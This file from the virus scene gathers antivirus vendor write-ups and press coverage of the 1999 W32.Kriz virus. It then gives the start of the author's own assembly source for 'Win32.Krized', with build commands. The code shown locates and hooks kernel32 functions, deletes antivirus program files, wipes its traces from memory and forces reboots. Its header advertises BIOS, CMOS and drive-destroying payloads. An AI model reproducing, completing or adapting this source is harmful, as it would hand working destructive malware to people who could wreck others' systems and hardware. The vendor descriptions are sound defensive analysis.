; Fucked up descriptions:

; SYMANTEC
; ---------------------------------------------------------------------------
; W32.KRIZ
;
;           Aliases: W32.Kriz.3863, W32.Kriz.3740
; Area of Infection: Windows 9x/NT PE files
;        Likelihood: Rare
;   Region Reported: Worldwide
;   Characteristics: Wild, BIOS, December 25
;
;
; Description:
; W32.Kriz is a Windows 9x/NT virus, which infects Portable Executable (PE)
; Windows files. The virus goes resident into memory, attempting to infect
; any files that are opened by the user or applications. If infected with
; this virus, the user should verify they have "booted clean" before
; attempting to scan and repair files.
;
; The virus also modifies the KERNEL32.DLL. This file must be replaced with
; a known, clean backup. In addition, this virus may corrupt some PE files,
; requiring them to be replaced by known, clean backups (or from the
; installation package).
;
; The W32.Kriz virus also contains a payload, which is executed on December
; 25th.
;
; The first time the virus is executed on a system, it will create an
; infected copy of KERNEL32.DLL in the Windows system directory. The file
; will be named KRIZED.TT6. If this file is found in the Windows system
; directory, it should be deleted. The next time Windows is started, this
; file will be copied over the original KERNEL32.DLL. Then, the virus infects
; other files when certain Windows API functions are called by a program.
;
; There are variants of this virus. Some of the differences between variants
; pertain to the payload. The 3863 variant will access more types of drives
; when overwriting files. Other differences include the method of infection.
; The 3740 variant will create a new section named "…" and copy its viral
; code to that newly created section. The 3863 variant will simply append its
; code to the end of the last section.
;
; Currently, only the 3863 variant has been found in the wild. There is a
; 3863.b version of this virus. It is the same as the 3863 variant except
; that some of the unused text at the end of the virus has been corrupted.
;
; Payload:
; If the system date is December 25th, the virus will attempt to flash the
; BIOS of the computer. This will prevent the computer from booting up
; properly and may require a change of hardware. Information stored in the
; CMOS will be cleared. So the date, time, hard drive and floppy drive
; settings, peripheral configuration, etc. will need to be restored. The
; virus will also begin overwriting files on all available drives. This
; includes mapped network drives, floppy drives and RAM disks. This payload
; is very similar to W95.CIH.
;
;
; Write-up by: Eric Chien
; September 1, 1999


; AVP
; ---------------------------------------------------------------------------
; WIN32.KRIZ
;
; It is a memory resident polymorphic Windows virus. It replicates under
; Windows32 systems and infects PE EXE files (Windows executable) with EXE
; and SCR filename extensions, as well as the Windows KERNEL32.DLL system
; library that allows the virus to stay memory resident during a whole
; Windows session. The virus in infected KERNEL32.DLL hooks files access
; functions, intercepts file copying, opening, moving, e.t.c. and infects
; files that are accessed. The virus checks file names and does not infect
; several anti-virus program files:
;
;  _AVP32.EXE, _AVPM.EXE, ALERTSVC.EXE, AMON.EXE, AVP32.EXE, AVPM.EXE,
;  N32SCANW.EXE, NAVAPSVC.EXE, NAVAPW32.EXE, NAVLU32.EXE, NAVRUNR.EXE,
;  NAVWNT.EXE, NOD32.EXE, NPSSVC.EXE, NSCHEDNT.EXE, NSPLUGIN.EXE,
;  SCAN.EXE, SMSS.EXE
;
; The virus has an extremely dangerous payload that is activated on December
; 25th. On this day when infecting any file (i.e. when they are accessed by
; any of the Windows functions listed below), the virus "kills" information
; stored in CMOS memory, overwrites data in all files on all available
; drives, and then messes-up the Flash BIOS by using the same routine that
; was found in the "Win95.CIH" virus (aka Chernobyl).
;
; When an infected file is run, the virus' polymorphic decryption loop takes
; control and restores the virus code back to its original form. The virus
; then scans the Windows32 kernel, gets addresses of necessary Windows
; functions and calls the KERNEL32 infection routine.
;
; While infecting a file the virus creates a new file section at the end of
; the file, encrypts and writes its code to there. To separate infected and
; not yet infected files the virus writes the "666" ID string to the PE file
; header reserved field. The virus section has the "..." name.
;
; While infecting the KERNEL32.DLL module the virus also patches its Export
; table (exported functions) and modifies several functions' addresses so,
; that on next Windows startup the calls to KERNEL32 function will be
; filtered by virus hookers. That allows the virus to monitor file access
; calls.
;
; The virus hooks 16 KERNEL32 functions - file opening, copying, deleting,
; reading/writing file attributes, creating a new process. The complete list
; of hooked functions looks as follows:
;
;  CopyFileA CopyFileW
;  CreateFileA CreateFileW
;  DeleteFileA DeleteFileW
;  MoveFileA MoveFileExA MoveFileW MoveFileExW
;  GetFileAttributesA SetFileAttributesW
;  SetFileAttributesA SetFileAttributesExA
;  CreateProcessA CreateProcessW
;
; To infect the KERNEL32.DLL file that can be opened in read-only more only,
; the virus uses a standard trick. It copies this file with temporary name
; (this copy has KRIZED.TT6 name and it is created in the Windows system
; directory), infects it and writes "rename" instruction to the WININIT.INI
; file. This trick allows the virus to infect the copy of KERNEL32.DLL and
; force Windows to replace the original KERNEL32.DLL with infected copy on
; next startup.
;
; The virus contains internal text strings that are not used in any way:
;
;  =( [c] 1999 [t] )=
;
;  YOU CALL IT RELIGION, YOU'RE FULL OF SHIT
;  YOU NEVER KNEW, YOU NEVER DID, YOU NEVER WILL
;  YOU'RE SO FULL OF SHIT, I DON'T WANT TO HEAR IT
;  ALL YOU DO IS TALK ABOUT YOURSELF
;  I DON'T WANNA HEAR IT, COZ I KNOW NONE OF IT'S TRUE
;  I'M SICK AND TIRED OF ALL YOUR GODDAMN LIES
;  LIES IN THE NAME OF GOD
;  WHEN ARE YOU GOING TO REALIZE THAT I DON'T WANT TO HEAR IT?!
;  I KNOW YOU'RE SO FULL OF SHIT, SO SHUT YOUR FUCKING MOUTH
;  YOU KEEP ON TALKING, TALKING EVERYDAY
;  FIRST YOU'RE TELLING STORIES, THEN YOU'RE TELLING LIES
;  WHEN THE FUCK ARE YOU GOING TO REALIZE THAT I DON'T WANT TO HEAR IT!!
;  AH, SHUT THE FUCK UP...
;
; KRIZ.3862
;
; This virus version is very closely related to the original one and differs
; only by additional programming tricks, another "copyright" text string:
;
;  (c) T2 & Immortal Riot
;
; and an improved disk erasing routine: in addition to erasing CMOS, Flash
; and files on logical drives this virus enumerates all available network
; drives and erases all files on them. While erasing files the virus
; truncates them and overwrites them with the "DEAD BEEF" hexadecimal string
; (DEADBEEFh).
;
; KRIZ.4029
;
; This virus version is very closely related to the previous one
; ("Kriz.3836"). The differences are: some routines were improved; the
; destruction routine is also activated if the SoftIce debugger is installed
; in the system; the "copyright" text was also changed:
;
;  T-2000 / Immortal Riot
;
; Text added: June-30-1999
; New variant Win32.Kriz.3862: August-18-1999
; More information about Kriz.3862 added: August-23-1999
; Kriz.4029 desc. added: September-05-1999


; PANDA
; ---------------------------------------------------------------------------
; CMOS AND FLASH MEMORIES: PRIME OBJECTIVES OF WIN32.KRIZ
;
; Panda detects and eliminates this virus, and it is the only developer
; capable of disinfecting the Kernel32.DLL library file.
;
; SAN FRANCISCO, August, 27th, 1999 -- Win32.Kriz is a resident polymorphic
; virus that runs under all Win32 platforms (Windows 95, Windows 98 and
; Windows NT) and infects Windows executable files (EXE extensions), screen
; saver files (SCR extensions) and the KERNEL32.DLL system library. Although
; its polymorphic generation routine is quite simple, the virus hides several
; programming tricks up its sleeve to complicate its debugging.
;
; Win32.Kriz's destructive payload is produced on the 25th of December. If,
; on that day, more than 256 infected EXE or SCR files have been accessed,
; the virus deletes the CMOS memory (which contains, among other information,
; data concerning the date, time, type of hard disk, etc.), damages the FLASH
; memory and overwrites all files contained in any network drive.
;
; The first time a file infected by Win32.Kriz is executed in a clean system,
; the polymorphic routines takes over and decrypts the remaining virus code
; in order to subsequently scan the resident area of KERNEL32 to locate the
; addresses of the following API's:
;
; CopyFileA, CreateFileA, CreateProcessA, DeleteFileA, GetFileAttributesA,
; MoveFileA, MoveFileExA, SetFileAttributesA, CopyFileW, CreateFileW,
; CreateProcessW, DeleteFileW, GetFileAttributesW, MoveFileW, MoveFileExW,
; SetFileAttributesW, CloseHandle, CreateFileMappingA, FindClose,
; FindFirstFileA, FindNextFileA, FreeLibrary, GetCurrentDirectory,
; GetDriveTypeA, GetFileSize, GetLocalTime, GetLogicalDriveStringsA,
; GetProcAddress, GetSystemDirectoryA, GetTickCount, GetWindowsDirectory,
; GlobalAlloc, GlobalFree, LoadLibraryA, MapViewOfFile, SetCurrentDirectory,
; SetFileTime, UnmapViewOfFile, WriteFile, WritePrivateProfile.
;
; The virus calculates the CRC16 of the name of the APIs that the KERNEL32
; exports and compares them with the list of the ones it needs to
; subsequently infect the KERNEL32.DLL file. It then overwrites the position
; of these APIs with the corresponding addresses of the viral routines.
;
; Win32.Kriz copies the KERNEL32.DLL file (from the c:\windows\system
; directory), renames it as KRIZED.TT6 and infects it, calculating the file's
; checksum correctly so that it does not generate any execution problems
; under Windows NT. Once the KRIZED.TT6 temp file has been infected, the
; virus creates a WININIT.INI file that automatically replaces the original
; KERNEL32.DLL file with the new infected copy. This way, upon the next
; system startup, Win32.Kriz will remain resident throughout the entire
; session, even if no other infected file is executed. In the first session,
; the virus is not resident in memory and will not infect any files as long
; as the system is not restarted. Then, when the system is booted with an
; infected copy of the KERNEL32.DLL file, Win32.Kriz will attack any file
; that is accessed (upon copying, moving, running, creating or attribute
; modification) after the APIs that were intercepted are called.
;
; Win32.Kriz contains the following text:
;
;  (c) T2 & Immortal Riot
;
;  YOU CALL IT RELIGION, YOU'RE FULL OF SHIT
;  YOU NEVER KNEW, YOU NEVER DID, YOU NEVER WILL
;  YOU'RE SO FULL OF SHIT, I DON'T WANT TO HEAR IT
;  ALL YOU DO IS TALK ABOUT YOURSELF
;  I DON'T WANNA HEAR IT, COZ I KNOW NONE OF IT'S TRUE
;  I'M SICK AND TIRED OF ALL YOUR GODDAMN LIES
;  LIES IN THE NAME OF GOD
;  WHEN ARE YOU GOING TO REALIZE THAT I DON'T WANT TO HEAR IT?!
;  I KNOW YOU'RE SO FULL OF SHIT, SO SHUT YOUR FUCKING MOUTH
;  YOU KEEP ON TALKING, TALKING EVERYDAY
;  FIRST YOU'RE TELLING STORIES, THEN YOU'RE TELLING LIES
;  WHEN THE FUCK ARE YOU GOING TO REALIZE THAT I DON'T WANT TO HEAR IT!!
;  AH, SHUT THE FUCK UP...
;
; Panda detects and eliminates Win32.Kriz, thereby protecting users against
; this virus, which is a harmful threat to their systems. In addition, Panda
; is the only antivirus developer capable of disinfecting the Kernel32.DLL
; library file. For this, the computer must be booted in MS-DOS mode, since
; the affected files are used by Windows upon computer startup.


; NAI
; ---------------------------------------------------------------------------
; VIRUS NAME
; W32/Kriz.3862
;
; DATE ADDED
; 8/16/99
;
; VIRUS CHARACTERISTICS
; This is Windows 95/98 and NT virus that infects PE EXE files. It is also
; polymorphic. When an infected file is executed, this virus will stay
; resident in memory until the next time the system is rebooted. This virus
; encrypts its code, leaving only a small random decryptor. This virus will
; infect files as they are opened by any application while it is in memory.
; This will occur when a user scans files as well.
;
; The virus also has a payload which activates when an infected file is run
; on December 25th. When it does it will attempt To erase the computer's CMOS
; information, which contains information such as date and time, and the type
; of hard disk the computer uses. This virus will also attempt to directly
; erase disk sectors. It will attempt to flash the BIOS with garbage. This
; only works on certain types of BIOSes. If this succeeds, the computer will
; not boot. This is similar to the action taken by the CIH virus. If the
; virus is successful the computer will not boot up, not even from a floppy
; disk. In some cases the virus will corrupt the file it infects and cleaning
; may not be possible.
;
; This virus will infect kernel32.dll. When it does, it replaces the original
; contents with it owns. Because of this the file can NOT be repaired, it
; must be replaced.
;
; This virus code also contains a poem that contains quite a bit of
; profanity. It is never displayed, nor is it used in any of the routines
; it runs.
;
; INDICATIONS OF INFECTION
; Not Available...
;
; METHOD OF INFECTION
; When first run on a clean machine, the virus checks KERNEL32.DLL to see if
; it is infected, if yes then the virus exits. If KERNEL32.DLL is not
; infected then the virus copies KERNEL32.DLL to WINDOWS\SYSTEM\KRIZED.TT6
; and then the virus infects this local copy. The virus then creates the file
; WINDOWS\WININIT.INI containing the lines :-
;
;  [rename]
;  C:\WINDOWS\SYSTEM\KERNEL32.DLL=C:\WINDOWS\SYSTEM\KRIZED.TT6
;
; This causes windows to replace KERNEL32.DLL with the infected copy when the
; system is next re-started.  In the infected copy of KERNEL32.DLL the virus
; hooks the following functions :-
;
;  CopyFileA
;  CopyFileW
;  CreateFileA
;  CreateFileW
;  CreateProcessA
;  CreateProcessW
;  DeleteFileA
;  DeleteFileW
;  GetFileAttributesA
;  GetFileAttributesW
;  MoveFileA
;  MoveFileW
;  MoveFileExA
;  MoveFileExW
;  SetFileAttributesA
;  SetFileAttributesW
;
; This causes any PE executable file that is run, copied, moved or scanned to
; be infected by the virus.
;
; VIRUS INFORMATION
;      DISCOVERY DATE: 8/16/99
;                TYPE: Win32
;     RISK ASSESSMENT: medium-AvertWatch List
;         MINIMUM DAT: 4039
;
; VARIANTS
; Unknown
;
; ALIASES
; Kriz


; ZDNN (some PC news site)
; ---------------------------------------------------------------------------
; 'CHRISTMAS' VIRUS CAN DESTROY PCs
;
; New virus set to hit Dec. 25, delivering a payload that can kill a Windows
; PC's BIOS. Is it as bad as CIH?
;
; By Bob Sullivan, MSNBC
; August 18, 1999 3:00 PM PT
;
; A nasty new virus discovered by researchers promises to do even more damage
; to victims than the Chernobyl virus. It has the ability not only to erase
; files, but also to render a PC useless by destroying its flash BIOS.
;
; The good news is it won't execute until Dec. 25; the bad news is PC users
; without anti-virus programs may have a very bad Christmas Day.
;
; The author of Win32.Kriz, discovered recently by researchers, sounds as if
; he or she has an ax to grind against religious folks.
;
; Inside the virus is a text string with a poem full of expletives
; criticizing those who preach religion: "I don't wanna hear it, coz I know
; none of it's true," the author writes, according to anti-virus research
; firm Kaspersky Lab.
;
; Victims of the virus -- who can be anyone using Windows 95, Windows 98 or
; Windows NT -- can expect a load of trouble. The virus kills the CMOS
; memory, overwrites data in all files on all available drives, and then
; destroys the flash BIOS by using the same routine that was found in the
; "Win95_CIH" virus, also known as Chernobyl.
;
; "This is a nasty one, very well written," said Dan Takata of anti-virus
; vendor Data Fellows Inc.
;
; He said it's too early to tell if the virus will be widespread -- but
; potential victims have until Dec. 25 to update their antivirus programs
; against it.


; AVP PRESS
; ---------------------------------------------------------------------------
; New Windows Virus Named Win32.Kriz.3740 Discovered
;
; Attacks Executable and Screen Saver Files
;
; Medina, OH August 18, 1999 -- Central Command and Kaspersky Lab announce
; the discovery of a new Windows virus that contains same destructive payload
; as the Chernobyl virus that rendered thousands of computers in Asia
; unusable.
;
; Named Win32.Kriz.3740, the virus contains even more deadly capacity than
; the original Chernobyl virus. The Win32.Kriz.3740 virus, on December 25th,
; erases the CMOS memory, overwrites data in all files on all available
; drives, and then destroys the Flash BIOS by using the same routine that was
; found in the Win95.CIH virus (aka Chernobyl virus).
;
; Win32.Kriz.3740 is a memory resident, polymorphic, Windows virus. It
; replicates under Windows 95, Windows 98, and Windows NT systems and infects
; Windows programs with EXE (executable) and SCR (screen savers) filename
; extensions, as well as Windows KERNEL32.DLL system library that allows the
; virus to stay memory resident during the entire Windows session.


; SOPHOS
; ---------------------------------------------------------------------------
;  VIRUS NAME: W32/Kriz.
;     ALIASES: Kriz, W32.Kriz.3740, Win32.Kriz.
;        TYPE: PE executable virus.
;    RESIDENT: Yes.
;     STEALTH: No.
; DESCRIPTION: This virus, which works under Windows 95/98 and Windows NT,
;              infects PE (Portable Executable) files with .EXE or .SCR
;              extensions. It also infects KERNEL32.DLL.
;
;              W32/Kriz has a particularly destructive payload. On December
;              25th it will erase the CMOS setup, attempt to corrupt the
;              system BIOS (in a similar way to W95/CIH-10xx) and attempt to
;              overwrite all files on all local hard disks and network drives
;              with garbage.
;
;              If the system BIOS corruption is successful you will no longer
;              be able to use your computer, and the BIOS chip may need to be
;              replaced.
;
;              There are two known variants of this virus, but only one of
;              these is known to be in the wild.


; Note, all bugs mentioned in the articles above have been fixed.

; Source:


;============================================================================
;
;
;        NAME: Win32.Krized v1.666
;        TYPE: Parasitic resident polymorphic K32/PE-infector.
;          OS: Windoze 95/98/NT/2000.
;         CPU: 386+
;        SIZE: Around 4k.
;      AUTHOR: T-2000 / Immortal Riot.
;      E-MAIL: T2000_@hotmail.com
;        DATE: April 1999 - August 1999.
;     PAYLOAD: Judgement Day on X-mas.
;
;
;    FEATURES:
;
;       - Completely Win32-compatible.
;       - Achieves global Win32-residency by kernel-infection.
;       - Polymorphic encrypted in files (PE/K32).
;       - Traps possible errors with SEH's.
;       - Anti-debugger/disassembler/emulator code.
;       - Calculates correct image-checksum when needed.
;       - Kills various AV-programs.
;       - Win9x-payload: ring-0 CMOS & BIOS-trashing.
;       - Win32-payload: local & network drive-trashing.
;
;
; Succesfully tested under Windoze 95, 98, NT 4.0, and 2000 beta 3.
;
; Creds go to Johnny Panic for the CRC-routines, to CIH for the
; BIOS-nuker, and to Rude Boy for the image-checksum algorithm.
;
; Assemble with: TASM32 KRIZED.ASM /ml /m
;                TLINK32 KRIZED.OBJ IMPORT32.LIB
;
; Greets to Metal Militia, The Unforgiven, Johnny Panic, Bad Spirit,
; Godlike, Retch, The Lich, LovinGod, Vendigo, Morphine, and Lord Julus.
;
;============================================================================


		ORG     0

		.386p
		.MODEL  FLAT

	; Stuff our code in the data-section, which is already
        ; readable/writeable, so we don't have to manually set
        ; the write-bit to the code-section anymore.

		.DATA

; Some exports, only used by the carrier.
EXTRN           ExitProcess:PROC
EXTRN           GetFileAttributesA:PROC
EXTRN           MessageBoxA:PROC

		; *** Various equates we use. ***

GENERIC_READ                    EQU     80000000h
GENERIC_WRITE                   EQU     40000000h
OPEN_EXISTING                   EQU     00000003h
FILE_ATTRIBUTE_NORMAL           EQU     00000080h
PAGE_READONLY                   EQU     00000002h
PAGE_READWRITE                  EQU     00000004h
FILE_MAP_READ                   EQU     00000004h
FILE_MAP_WRITE                  EQU     00000002h

EWX_REBOOT                      EQU     00000002h
EWX_FORCE                       EQU     00000004h

MOVEFILE_REPLACE_EXISTING       EQU     00000001h
MOVEFILE_DELAY_UNTIL_REBOOT     EQU     00000004h

ERROR_ACCESS_DENIED             EQU     00000005h

RESOURCE_CONNECTED              EQU     00000001h
RESOURCETYPE_DISK               EQU     00000001h

DRIVE_REMOVABLE                 EQU     00000002h
DRIVE_CDROM                     EQU     00000005h
DRIVE_RAMDISK                   EQU     00000006h

Virus_Size                      EQU     (Virus_End-START)
Poly_Size                       EQU     200     ; Maximum size of generated
						; polymorphic decryptors.

Work_API_Count                  EQU     (End_Work_API_CRC-Work_API_CRC) / 2
Hook_API_Count                  EQU     (Work_API_CRC-Hook_API_CRC) / 2
Kill_CRC_Count                  EQU     (End_Kill_Table-Kill_Table) / 2

; Equates used to index the API address table.

ixCopyFileA                     EQU     00
ixCreateFileA                   EQU     01
ixCreateProcessA                EQU     02
ixDeleteFileA                   EQU     03
ixGetFileAttributesA            EQU     04
ixMoveFileA                     EQU     05
ixMoveFileExA                   EQU     06
ixSetFileAttributesA            EQU     07

ixCopyFileW                     EQU     08
ixCreateFileW                   EQU     09
ixCreateProcessW                EQU     10
ixDeleteFileW                   EQU     11
ixGetFileAttributesW            EQU     12
ixMoveFileW                     EQU     13
ixMoveFileExW                   EQU     14
ixSetFileAttributesW            EQU     15

ixCloseHandle                   EQU     16
ixCreateFileMappingA            EQU     17
ixFindClose                     EQU     18
ixFindFirstFileA                EQU     19
ixFindNextFileA                 EQU     20
ixGetCurrentDirectoryA          EQU     21
ixGetDriveTypeA                 EQU     22
ixGetFileSize                   EQU     23
ixGetFileTime                   EQU     24
ixGetLastError                  EQU     25
ixGetLocalTime                  EQU     26
ixGetLogicalDriveStringsA       EQU     27
ixGetProcAddress                EQU     28
ixGetSystemDirectoryA           EQU     29
ixGetTickCount                  EQU     30
ixGetWindowsDirectoryA          EQU     31
ixGlobalAlloc                   EQU     32
ixGlobalFree                    EQU     33
ixLoadLibraryA                  EQU     34
ixMapViewOfFile                 EQU     35
ixSetCurrentDirectoryA          EQU     36
ixSetFileTime                   EQU     37
ixUnmapViewOfFile               EQU     38
ixWriteFile                     EQU     39
ixWritePrivateProfileStringA    EQU     40



CRC16   MACRO   String

	CRC_Reg = 0FFFFFFFFh

	IRPC _x, <String>
	  Ctrl_Byte = ('&_x&' XOR (CRC_Reg AND 0FFh))
	  CRC_Reg = (CRC_Reg SHR 8)
	  REPT 8
	    Ctrl_Byte = (Ctrl_Byte SHR 1) XOR (0EDB88320h * (Ctrl_Byte AND 1))
	  ENDM
	  CRC_Reg = (CRC_Reg XOR Ctrl_Byte)
	ENDM

	DW      (CRC_Reg AND 0FFFFh)
ENDM


		; === VIRUSCODE STARTS HERE ===
START:
		CALL    Get_Delta

		XOR     EDX, EDX                ; Zero EDX.
		JNZ     $+31337                 ; Simple anti-heuristic.

		; Zero the key of the decryptor, so the
		; code won't be fucked-up the next time
		; DLLMain get's called.

		MOV     [EBP+(Stupid_Dummy-START)], DL
Patch_Decrypt   =       DWORD PTR $-4

		MOV     EAX, EBP

		SUB     EAX, 1000h              ; Calculate our base-address.
Virus_RVA       =       DWORD PTR $-4

		; Calculate VA of our host.

		ADD     EAX, (1000h+(Carrier-START))
Host_EIP        =       DWORD PTR $-4

		MOV     [ESP+(9*4)], EAX        ; Patch return-address with
						; original entrypoint.

		JMP     CALL_Setup_SEH          ; Abort further processing?
Init_Mode       =       BYTE PTR $-1

		JMP     Return_To_Host

CALL_Setup_SEH: CALL    Setup_Load_SEH          ; Bump SEH-address on stack.

		MOV     ESP, [ESP+(2*4)]        ; Restore original ESP.

JMP_R_Init_SEH: JMP     Rest_Init_SEH           ; And end further processing.

Author          DB      'T-2000 / Immortal Riot', 0

Setup_Load_SEH: PUSH    DWORD PTR FS:[EDX]      ; Bump original SEH on stack.
		MOV     FS:[EDX], ESP           ; Stuff our own SEH-address.

		MOV     EAX, [ESP+(12*4)]       ; Get pointer to last SEH.

		XOR     AX, AX                  ; Align on a 64k boundary.

Find_K32_Base:  CMP     EAX, 400000h            ; Below application-memory?
		JB      JMP_R_Init_SEH

		CMP     [EAX.MZ_Mark], 'ZM'     ; Found the kernel?
		JNE     Loop_Find_K32

		CMP     [EAX.MZ_Reloc_Table], 40h  ; K32 has a PE-header.
		JB      Loop_Find_K32

		MOV     EBX, [EAX+3Ch]          ; RVA of PE-header.
		ADD     EBX, EAX                ; Plus base, (make it a VA).

		CMP     [EBX.PE_Mark], 'EP'     ; Verify PE-header, just in
		JNE     Loop_Find_K32           ; case.

		; Verify it's a DLL we've found.

		TEST    BYTE PTR [EBX.PE_Flags+1], 00100000b
		JNZ     Found_K32_Base

Loop_Find_K32:  SUB     EAX, 65536              ; Scan downwards, stuff
						; always gets loaded at
						; a 64k boundary.

		JMP     Find_K32_Base           ; Just repeat the loop.

Found_K32_Base: MOV     [EBP+(K32_Base-START)], EAX     ; Store K32-base.

		PUSH    [EBX.Image_Size]
		POP     DWORD PTR [EBP+(K32_Image_Size-START)]

		MOV     EBX, [EBX+120]          ; K32's export-table.
		ADD     EBX, EAX

		MOV     EDI, [EBX+(8*4)]        ; Array of API-name RVA's.
		ADD     EDI, EAX

		MOV     ECX, [EBX+(6*4)]        ; Amount of API-name RVA's.

		MOV     BYTE PTR [EBP+(Fetched_API-START)], (Hook_API_Count + Work_API_Count)

Loop_Export:    MOV     ESI, [EDI+(EDX*4)]      ; Offset of API-name.
		ADD     ESI, EAX

		PUSHAD

		XCHG    ECX, EAX                ; Save base-address in ECX.

		CALL    Calculate_CRC16         ; Calculate the CRC16 of this
						; API-name.

		MOV     ESI, [EBX+(9*4)]        ; Array of API-ordinals.
		ADD     ESI, ECX

		MOV     EBX, [EBX+(7*4)]        ; Array of API-handler RVA's.

		PUSH    EAX

		MOVZX   EAX, WORD PTR [ESI+(EDX*2)]

		LEA     ESI, [EBX+(EAX*4)]

		POP     EAX

                MOV     EBX, [ECX+ESI]

; NAV 9x seems to fuck around with the K32 memory image setting it's own
; export hooks, for example CreateProcessA and WinExec. Anyways, Krized
; would use hardcoded hooked addresses, and the next boot everything goes
; bang cuz NAV ain't loaded yet. To test for hooked addresses we check if
; the address is in range of the K32-image, and abort infect if it's not.

                CMP     EBX, 12345678h
K32_Image_Size  =       DWORD PTR $-4
		JNB     Rep_Loop_Name

		; Check if it's an API which we need.

		LEA     EDI, [EBP+(Hook_API_CRC-START)]
		PUSH    (Hook_API_Count+Work_API_Count)
		POP     ECX
		PUSH    ECX
		REPNE   SCASW

		POP     EAX

		JNE     Rep_Loop_Name

		SUB     EAX, ECX

		; Save API-address.

		MOV     [EBP+(API_Addresses-START)+(EAX*4)-4], EBX

		; Got another one.

		DEC     BYTE PTR [EBP+(Fetched_API-START)]

		CMP     AL, Hook_API_Count+1    ; Do we need to save this
		JNB     Rep_Loop_Name           ; API's export-address?

		MOV     [EBP+(Hook_Exports-START)+(EAX*4)-4], ESI

Rep_Loop_Name:  POPAD

		INC     EDX

		LOOP    Loop_Export

		JECXZ   @1

		DB      0E9h

@1:             CMP     AL, 0                   ; We're all API's found?
Fetched_API     =       BYTE PTR $-1
		JNZ     Wipe_Memory             ; Else abort further infect.

		PUSH    0FFFFFFFFh              ; Request for kernel-infect.
		POP     ESI
                CALL    Infect_File

	; Try to cover-up as many tracks as possible by clearing
	; most of our code in memory, as we don't need it anymore.

Wipe_Memory:    MOV     EDI, EBP
		MOV     CX, (Wipe_Memory-START)
		CLD
		REP     STOSB

		ADD     EDI, (Infect_File-Wipe_Memory)
		MOV     CX, (Virus_End-Infect_File)
		REP     STOSB

		MOV     ECX, 0                  ; Should we perform a reboot?
ExitWindowsEx   =       DWORD PTR $-4
		JECXZ   Rest_Init_SEH

		PUSH    EWX_FORCE OR EWX_REBOOT ; Force a system reboot.
		PUSH    0
		CALL    ECX

Rest_Init_SEH:  XOR     EAX, EAX

		POP     DWORD PTR FS:[EAX]      ; Unhook our own SEH.
		POP     EAX

Return_To_Host: POPAD                           ; Restore all registers.
		POPFD

		RET                             ; Return to our host.



;-------------------------------------------------
; ESI == 0FFFFFFFFh = Infect kernel.
; ESI != 0FFFFFFFFh = Infect file pointed by ESI.
;-------------------------------------------------
Infect_File:
		PUSHAD

		XOR     EBX, EBX

		CALL    Setup_Inf_SEH

		PUSHAD

		MOV     ESI, [ESP+(9*4)]        ; Grab exception-code off
		LODSD                           ; the stack.

		CALL    Get_Delta

		SHL     EAX, 4                  ; Strip flags.

		CMP     EAX, (03h SHL 4)        ; Virus' request to call an
		JE      Virus_Request           ; API ?

		MOV     ESP, [ESP+(10*4)]       ; Unhandled exception, so
						; abort further execution.
JMP_R_Inf_SEH:  JMP     Rest_Inf_SEH

Virus_Request:  MOV     EDX, [ESP+(11*4)]       ; Context-block.

		LEA     EAX, [EBP+(Perform_API-START)]

		XCHG    [EDX+184], EAX          ; Swap EIP.

		MOV     ECX, [EDX+196]          ; ESP.

; Win9x sets the exception-address with Exception_EIP + 1, whereas NT
; does the right thing and uses Exception_EIP, we need some extra
; code to keep this in account.

		CMP     BYTE PTR [EAX], 0CCh    ; This is the breakpoint?
		JNE     Swap_Address

		INC     EAX                     ; Skip breakpoint.

Swap_Address:   XCHG    [ECX], EAX              ; Swap index-number with
						; Perform_API's address.

                MOV     [EBP+(Work_API_Index-START)], AL

		POPAD

		XOR     EAX, EAX                ; Reload context and continue
						; execution.
		RET

Setup_Inf_SEH:  PUSH    DWORD PTR FS:[EBX]
		MOV     FS:[EBX], ESP

	; The virtual-size entry of object-headers is not reliable,
	; therefore we need to allocate our memory by hand.

		PUSH    (End_Heap-Virus_End)    ; Allocate memory on the
		PUSH    EBX                     ; global heap.
		PUSH    ixGlobalAlloc
		INT     03h

		XCHG    ECX, EAX                ; Error?
		JECXZ   JMP_R_Inf_SEH

		MOV     [EBP+(Global_Handle-START)], ECX

		MOV     [EBP+(Infect_Mode-START)], BL

		INC     ESI                     ; Request to infect K32 ?
		JZ      Payload_Test

		DEC     ESI                     ; Some API can have NULL.
		JZ      JMP_Free_Glo_M

		MOV     BYTE PTR [EBP+(Infect_Mode-START)], (Open_Candidate-Infect_Mode) - 1

		XCHG    EBX, EAX                ; Zero EAX.

		LEA     EBX, [ECX+(ANSI_Target_File-Virus_End)]

		MOV     EDI, EBX

		MOV     ECX, 260

		CLD

Convert_Path:   LODSB                           ; Fetch next byte/word.
		NOP
Unicode_Switch  =       WORD PTR $-2

		OR      AH, AH                  ; Is it non-ASCII  ?
		JNZ     JMP_Free_Glo_M          ; Then abort infect.

		CMP     AL, 'a'
		JB      Store_Upcase

		CMP     AL, 'z'
		JA      Store_Upcase

		SUB     AL, 'a' - 'A'           ; Convert to uppercase.
Store_Upcase:   STOSB

		OR      AL, AL
		JZ      Init_Find_Name

		LOOP    Convert_Path

JMP_Free_Glo_M: JMP     Free_Global_M

Init_Find_Name: MOV     ESI, EDI

Find_File_Name: DEC     ESI

		CMP     ESI, EBX                ; Reached the beginning?
		JE      Check_File_Ext

		CMP     BYTE PTR [ESI-1], '\'   ; Found start filename?
		JNE     Find_File_Name

Check_File_Ext: CMP     [EDI-5], 'EXE.'         ; Standard .EXE-file?
		JE      Calc_CRC_Name

		CMP     [EDI-5], 'RCS.'         ; Perhaps a screen-saver?
		JNE     JMP_Free_Glo_M

Calc_CRC_Name:  CALL    Calculate_CRC16         ; Calculate filename's CRC.

		; Kill AV-files.

                LEA     EDI, [EBP+(Kill_Table-START)]
                PUSH    Kill_CRC_Count
		POP     ECX
		REPNE   SCASW
                JNE     Payload_Test

		PUSH    FILE_ATTRIBUTE_NORMAL   ; Prevent any Happy99 alike
                PUSH    EBX                     ; 'protection'.
		PUSH    ixSetFileAttributesA
		INT     03h

                PUSH    EBX                     ; Later dude..
		PUSH    ixDeleteFileA
		INT     03h

Payload_Test:   CALL    Check_For_Payload       ; Activate?

		MOV     BYTE PTR [EBP+(Clear_Tracks_Sw-START)], (Free_Global_M-Clear_Tracks_Sw) - 1

		JMP     $
Infect_Mode     =       BYTE PTR $-1

		MOV     EBX, [EBP+(Global_Handle-START)]

		; Obtain the path to the Windoze system-directory,
		; which is most likely C:\WINDOWS\SYSTEM.

		PUSH    260
		LEA     ESI, [EBX+(Clean_K32_Path-Virus_End)]
		PUSH    ESI
		PUSH    ixGetSystemDirectoryA
		INT     03h

		LEA     EDI, [EBX+(Infected_K32_Path-Virus_End)]

		MOV     [EBP+(Offset_Inf_K32-START)], EDI

